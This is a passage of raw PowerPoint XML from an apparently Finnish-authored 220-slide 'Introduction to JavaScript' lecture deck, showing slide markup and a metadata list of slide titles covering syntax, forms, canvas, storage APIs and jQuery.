                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.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107046</TotalTime>
  <Words>32078</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Laajakuva</PresentationFormat>
  <Paragraphs>2845</Paragraphs>
  <Slides>220</Slides>
  <Notes>0</Notes>
  <HiddenSlides>0</HiddenSlides>
  <MMClips>0</MMClips>
  <ScaleCrop>false</ScaleCrop>
  <HeadingPairs>
    <vt:vector size="6" baseType="variant">
      <vt:variant>
        <vt:lpstr>Käytetyt fontit</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>Teema</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>Dian otsikot</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>220</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="226" baseType="lpstr">
      <vt:lpstr>Monotype Sorts</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Office-teema</vt:lpstr>
      <vt:lpstr>Introduction to JavaScript</vt:lpstr>
      <vt:lpstr>JavaScript</vt:lpstr>
      <vt:lpstr>ECMAScript Versions</vt:lpstr>
      <vt:lpstr>Client-side (Frontend) vs. Server-side (Backend)</vt:lpstr>
      <vt:lpstr>JavaScript Implementations</vt:lpstr>
      <vt:lpstr>Myths about JavaScript</vt:lpstr>
      <vt:lpstr>What Can Be Done in Client-side JavaScript?</vt:lpstr>
      <vt:lpstr>Client-side JavaScript limitations</vt:lpstr>
      <vt:lpstr>Future &amp; Importance of JavaScript</vt:lpstr>
      <vt:lpstr>JavaScript Demos</vt:lpstr>
      <vt:lpstr>Sources of Information</vt:lpstr>
      <vt:lpstr>Basic Syntax</vt:lpstr>
      <vt:lpstr>Common Conventions</vt:lpstr>
      <vt:lpstr>Reserved Words</vt:lpstr>
      <vt:lpstr>Hello World in JavaScript</vt:lpstr>
      <vt:lpstr>Hello Console World </vt:lpstr>
      <vt:lpstr>Interactive Hello World</vt:lpstr>
      <vt:lpstr>Better Interactive Hello World</vt:lpstr>
      <vt:lpstr>JavaScript Data Types</vt:lpstr>
      <vt:lpstr>Undefined</vt:lpstr>
      <vt:lpstr>Numbers</vt:lpstr>
      <vt:lpstr>BigInt (ES 2020)</vt:lpstr>
      <vt:lpstr>Arithmetic Operators</vt:lpstr>
      <vt:lpstr>Bitwise Operators</vt:lpstr>
      <vt:lpstr>Augmented Assignment Operators</vt:lpstr>
      <vt:lpstr>Comparison Operators</vt:lpstr>
      <vt:lpstr>Booleans - True / False Values</vt:lpstr>
      <vt:lpstr>Logical Operators</vt:lpstr>
      <vt:lpstr>Boolean Gotchas</vt:lpstr>
      <vt:lpstr>More Truth Value Gotchas</vt:lpstr>
      <vt:lpstr>Strings</vt:lpstr>
      <vt:lpstr>String Methods C-M</vt:lpstr>
      <vt:lpstr>String Methods R-S</vt:lpstr>
      <vt:lpstr>String Methods T</vt:lpstr>
      <vt:lpstr>String Examples</vt:lpstr>
      <vt:lpstr>Automatic Conversions</vt:lpstr>
      <vt:lpstr>String Literals</vt:lpstr>
      <vt:lpstr>Handling Objects</vt:lpstr>
      <vt:lpstr>Array</vt:lpstr>
      <vt:lpstr>Array Methods A-F</vt:lpstr>
      <vt:lpstr>Array Methods I-P</vt:lpstr>
      <vt:lpstr>Array Methods R-Z</vt:lpstr>
      <vt:lpstr>Array Examples</vt:lpstr>
      <vt:lpstr>More Array Examples</vt:lpstr>
      <vt:lpstr>Creating Random Numbers</vt:lpstr>
      <vt:lpstr>Random Lottery Numbers from 1-40</vt:lpstr>
      <vt:lpstr>Locale</vt:lpstr>
      <vt:lpstr>Language Codes or Locale Codes</vt:lpstr>
      <vt:lpstr>Locale Specific String Sorting and Display of Numbers</vt:lpstr>
      <vt:lpstr>Finding Errors in JavaScript</vt:lpstr>
      <vt:lpstr>Printing</vt:lpstr>
      <vt:lpstr>if – else if - else</vt:lpstr>
      <vt:lpstr>Checking If Variable Has a Value</vt:lpstr>
      <vt:lpstr>Ternary operator ? or Conditional Expression</vt:lpstr>
      <vt:lpstr>switch case</vt:lpstr>
      <vt:lpstr>switch case example</vt:lpstr>
      <vt:lpstr>while loop</vt:lpstr>
      <vt:lpstr>do while</vt:lpstr>
      <vt:lpstr>for loop</vt:lpstr>
      <vt:lpstr>For Loop Examples</vt:lpstr>
      <vt:lpstr>for in</vt:lpstr>
      <vt:lpstr>for of</vt:lpstr>
      <vt:lpstr>break and continue</vt:lpstr>
      <vt:lpstr>Dealing with Errors: try-catch - finally</vt:lpstr>
      <vt:lpstr>Simple "Calculator" Using Eval</vt:lpstr>
      <vt:lpstr>10x10 Multiplication Table</vt:lpstr>
      <vt:lpstr>Defining and Calling Functions</vt:lpstr>
      <vt:lpstr>Different Kind of Functions</vt:lpstr>
      <vt:lpstr>Default Parameters for Functions</vt:lpstr>
      <vt:lpstr>Variable Number of Arguments</vt:lpstr>
      <vt:lpstr>Spread Operator …</vt:lpstr>
      <vt:lpstr>Destructing Assignment</vt:lpstr>
      <vt:lpstr>Arrow Syntax (ES6)</vt:lpstr>
      <vt:lpstr>Functional Programming Using Arrays</vt:lpstr>
      <vt:lpstr>Generator Function</vt:lpstr>
      <vt:lpstr>Calculating Fibonacci Numbers using Generator</vt:lpstr>
      <vt:lpstr>Good Programming Rules</vt:lpstr>
      <vt:lpstr>JavaScript Scopes</vt:lpstr>
      <vt:lpstr>Old Style Variable Declaration</vt:lpstr>
      <vt:lpstr>ES6 Scoping Declarations</vt:lpstr>
      <vt:lpstr>var, let and const cheat sheet</vt:lpstr>
      <vt:lpstr>Hoisting</vt:lpstr>
      <vt:lpstr>Closures</vt:lpstr>
      <vt:lpstr>Closure Example</vt:lpstr>
      <vt:lpstr>Using Closure to Emulate Private Function</vt:lpstr>
      <vt:lpstr>Arrow Syntax Makes Closures Compact</vt:lpstr>
      <vt:lpstr>Simplified Module Pattern with no information hiding</vt:lpstr>
      <vt:lpstr>JavaScript Modules</vt:lpstr>
      <vt:lpstr>Example of Import and Export</vt:lpstr>
      <vt:lpstr>Using ES6+ Module Imports</vt:lpstr>
      <vt:lpstr>JavaScript Objects</vt:lpstr>
      <vt:lpstr>Prototype-Based Object-Oriented Programming (OOP)</vt:lpstr>
      <vt:lpstr>Prototype Vs Class-Based OOP</vt:lpstr>
      <vt:lpstr>JavaScript Object Examples</vt:lpstr>
      <vt:lpstr>Iterating Through Own Properties</vt:lpstr>
      <vt:lpstr>Extending Built-In Types</vt:lpstr>
      <vt:lpstr>Classic Style Constructor</vt:lpstr>
      <vt:lpstr>Defining Methods and Properties Classic Style</vt:lpstr>
      <vt:lpstr>Creating Instances and Using Them</vt:lpstr>
      <vt:lpstr>JS OOP Classic Style Continued</vt:lpstr>
      <vt:lpstr>ES6 Style Class Definitions</vt:lpstr>
      <vt:lpstr>Class Inheritance ES6 Style</vt:lpstr>
      <vt:lpstr>Methods for Prototypes</vt:lpstr>
      <vt:lpstr>Inheriting Other Objects Using Prototypes</vt:lpstr>
      <vt:lpstr>Setters and Getters</vt:lpstr>
      <vt:lpstr>Stack Using Set and Get</vt:lpstr>
      <vt:lpstr>Using _ to signify private / protected</vt:lpstr>
      <vt:lpstr>Using Closure for Emulating Private</vt:lpstr>
      <vt:lpstr>Symbol</vt:lpstr>
      <vt:lpstr>Using Symbols</vt:lpstr>
      <vt:lpstr>Using Symbols to Emulate Private</vt:lpstr>
      <vt:lpstr>Frozen Symbols</vt:lpstr>
      <vt:lpstr>Window Methods for Dialogs</vt:lpstr>
      <vt:lpstr>Placing JavaScript Code on a Webpage</vt:lpstr>
      <vt:lpstr>JavaScript Built-in Functions</vt:lpstr>
      <vt:lpstr>Regular Expressions</vt:lpstr>
      <vt:lpstr>Regular Expression Flags</vt:lpstr>
      <vt:lpstr>Boundary Type Assertions</vt:lpstr>
      <vt:lpstr>Groups and Ranges</vt:lpstr>
      <vt:lpstr>Character Groups</vt:lpstr>
      <vt:lpstr>Regular Expression Quantifiers</vt:lpstr>
      <vt:lpstr>Regular Expression Methods</vt:lpstr>
      <vt:lpstr>Regular Expression String Methods</vt:lpstr>
      <vt:lpstr>String Replace Patterns</vt:lpstr>
      <vt:lpstr>HTML5 Form Elements</vt:lpstr>
      <vt:lpstr>&lt;form&gt; element</vt:lpstr>
      <vt:lpstr>&lt;fieldset&gt;, &lt;legend&gt; and &lt;label&gt;</vt:lpstr>
      <vt:lpstr>&lt;input&gt; element attributes</vt:lpstr>
      <vt:lpstr>&lt;input&gt; element attributes continued</vt:lpstr>
      <vt:lpstr>&lt;input&gt; element types</vt:lpstr>
      <vt:lpstr>&lt;input&gt; element types continued</vt:lpstr>
      <vt:lpstr>Examples of Input Elements</vt:lpstr>
      <vt:lpstr>&lt;textarea&gt;</vt:lpstr>
      <vt:lpstr>&lt;select&gt;, &lt;optgroup&gt;, &lt;option&gt;</vt:lpstr>
      <vt:lpstr>&lt;datalist&gt;</vt:lpstr>
      <vt:lpstr>Form buttons</vt:lpstr>
      <vt:lpstr>Reading and Writing form data</vt:lpstr>
      <vt:lpstr>&lt;textarea&gt; and &lt;input type="text|password|hidden|file|number|etc."&gt; </vt:lpstr>
      <vt:lpstr>Reading and writing input and textarea data</vt:lpstr>
      <vt:lpstr>Checkboxes and Radio Buttons</vt:lpstr>
      <vt:lpstr>Processing Checkboxes</vt:lpstr>
      <vt:lpstr>&lt;select&gt; &lt;option&gt;</vt:lpstr>
      <vt:lpstr>Select Option Example</vt:lpstr>
      <vt:lpstr>Multi Select Example</vt:lpstr>
      <vt:lpstr>Enter Triggering a Button Press in a Text Field</vt:lpstr>
      <vt:lpstr>Basics of Events</vt:lpstr>
      <vt:lpstr>JavaScript Calculator</vt:lpstr>
      <vt:lpstr>Date</vt:lpstr>
      <vt:lpstr>Calculating with Dates</vt:lpstr>
      <vt:lpstr>Number</vt:lpstr>
      <vt:lpstr>Timers</vt:lpstr>
      <vt:lpstr>Simple Clock</vt:lpstr>
      <vt:lpstr>window.open</vt:lpstr>
      <vt:lpstr>Pop-up Windows</vt:lpstr>
      <vt:lpstr>Writing to a Popup Window</vt:lpstr>
      <vt:lpstr>Image Roll-Over</vt:lpstr>
      <vt:lpstr>Common Usability Problems in Forms</vt:lpstr>
      <vt:lpstr>Mouse Wheel Events</vt:lpstr>
      <vt:lpstr>Scriptlets</vt:lpstr>
      <vt:lpstr>Creating Elements and Attributes</vt:lpstr>
      <vt:lpstr>Example of Manipulating DOM</vt:lpstr>
      <vt:lpstr>Common JavaScript Mistakes</vt:lpstr>
      <vt:lpstr>Canvas</vt:lpstr>
      <vt:lpstr>Canvas Capabilities</vt:lpstr>
      <vt:lpstr>&lt;canvas&gt; tag</vt:lpstr>
      <vt:lpstr>Canvas Code Template</vt:lpstr>
      <vt:lpstr>Drawing Shapes</vt:lpstr>
      <vt:lpstr>Defining and Drawing Paths</vt:lpstr>
      <vt:lpstr>Drawing Text</vt:lpstr>
      <vt:lpstr>Canvas Styles &amp; Colors</vt:lpstr>
      <vt:lpstr>Gradients and Patterns</vt:lpstr>
      <vt:lpstr>Gradient Examples</vt:lpstr>
      <vt:lpstr>Canvas Transformations</vt:lpstr>
      <vt:lpstr>Notes about Transformations</vt:lpstr>
      <vt:lpstr>Canvas Compositing &amp; Clipping</vt:lpstr>
      <vt:lpstr>Creating an Animation with Canvas</vt:lpstr>
      <vt:lpstr>Animated Rectangle</vt:lpstr>
      <vt:lpstr>Animation Using Transformations</vt:lpstr>
      <vt:lpstr>Drawing Images</vt:lpstr>
      <vt:lpstr>Loading a Bitmap and Displaying It</vt:lpstr>
      <vt:lpstr>Registering Event Handlers</vt:lpstr>
      <vt:lpstr>Writing Event Handlers</vt:lpstr>
      <vt:lpstr>Calculating Mouse Coordinates</vt:lpstr>
      <vt:lpstr>Reading Keyboard Presses</vt:lpstr>
      <vt:lpstr>Preventing Default Action</vt:lpstr>
      <vt:lpstr>Preventing Event Bubbling</vt:lpstr>
      <vt:lpstr>Preventing Side Effects (Browser Defaults)</vt:lpstr>
      <vt:lpstr>HTML5 &lt;audio&gt; element</vt:lpstr>
      <vt:lpstr>Using HTML5 &lt;audio&gt; element</vt:lpstr>
      <vt:lpstr>HTML5 video element</vt:lpstr>
      <vt:lpstr>Using HTML5 video element</vt:lpstr>
      <vt:lpstr>HTML5 Audio and Video API</vt:lpstr>
      <vt:lpstr>Audio Player in JS</vt:lpstr>
      <vt:lpstr>Pre-loading Audio</vt:lpstr>
      <vt:lpstr>Geolocation API</vt:lpstr>
      <vt:lpstr>Geolocation Position Object</vt:lpstr>
      <vt:lpstr>Geolocation Example</vt:lpstr>
      <vt:lpstr>HTML5 Local Storage</vt:lpstr>
      <vt:lpstr>Example of Using window.localStorage</vt:lpstr>
      <vt:lpstr>Indexed Database</vt:lpstr>
      <vt:lpstr>Using Indexed Database</vt:lpstr>
      <vt:lpstr>IndexedDB Transactions</vt:lpstr>
      <vt:lpstr>Transaction Events</vt:lpstr>
      <vt:lpstr>Removing Data</vt:lpstr>
      <vt:lpstr>Getting Data from IndexedDB</vt:lpstr>
      <vt:lpstr>Using Cursors</vt:lpstr>
      <vt:lpstr>Using IndexedDB with Dexie.js</vt:lpstr>
      <vt:lpstr>Web Workers</vt:lpstr>
      <vt:lpstr>Web Worker Code Example</vt:lpstr>
      <vt:lpstr>jQuery</vt:lpstr>
      <vt:lpstr>jQuery ready</vt:lpstr>
      <vt:lpstr>jQuery Selectors</vt:lpstr>
      <vt:lpstr>More jQuery Selectors</vt:lpstr>
      <vt:lpstr>jQuery DOM Traversal Methods</vt:lpstr>
      <vt:lpstr>jQuery DOM Manipulation</vt:lpstr>
      <vt:lpstr>jQuery Events</vt:lpstr>
      <vt:lpstr>jQuery Visual Effects</vt:lpstr>
      <vt:lpstr>jQuery AJAX</vt:lpstr>
      <vt:lpstr>jQuery UI</vt:lpstr>
      <vt:lpstr>jQuery Mobile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JavaScript</dc:title>
  <dc:creator>Petri Kuittinen</dc:creator>
  <cp:lastModifiedBy>Petri Kuittinen</cp:lastModifiedBy>
  <cp:revision>588</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2010-01-08T08:20:52Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-09-20T14:56:39Z</dcterms:modified>
</cp:coreProperties>
</file>